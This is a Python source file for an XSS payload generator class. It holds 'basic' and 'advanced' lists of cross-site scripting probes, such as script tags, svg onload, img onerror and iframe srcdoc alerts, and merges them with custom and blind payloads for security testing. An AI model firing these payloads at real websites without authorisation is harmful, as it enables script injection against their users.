from __future__ import annotations

from collections import OrderedDict
from collections.abc import Iterable, Sequence


class XssPayloadGenerator:
    """Generate XSS payloads with browser fallback strategies."""

    _PAYLOAD_SETS: dict[str, Sequence[str]] = {
        "basic": (
            "<script>alert(1)</script>",
            "\"'><svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
        ),
        "advanced": (
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<body onload=alert(document.domain)>",
            "<svg><script href=data:,alert(1)></script>",
        ),
    }

    def generate(
        self,
        payload_sets: Iterable[str] | None = None,
        custom_payloads: Iterable[str] | None = None,
        blind_payload: str | None = None,
    ) -> list[str]:
        """Return a de-duplicated payload list preserving priority order."""

        ordered: OrderedDict[str, None] = OrderedDict()

        for name in payload_sets or ("basic",):
            for payload in self._PAYLOAD_SETS.get(name, ()):  # ignore unknown names
                ordered.setdefault(payload, None)

        for payload in custom_payloads or ():
            if payload:
                ordered.setdefault(payload, None)

        if blind_payload:
            ordered.setdefault(blind_payload, None)

        return list(ordered.keys())

    def generate_basic_payloads(self) -> list[str]:
        """Generate basic XSS payloads for testing."""
        return self.generate(payload_sets=["basic"])
    
    def generate_advanced_payloads(self) -> list[str]:
        """Generate advanced XSS payloads for testing."""
        return self.generate(payload_sets=["advanced"])
    
    def generate_all_payloads(self) -> list[str]:
        """Generate all available XSS payloads."""
        return self.generate(payload_sets=["basic", "advanced"])
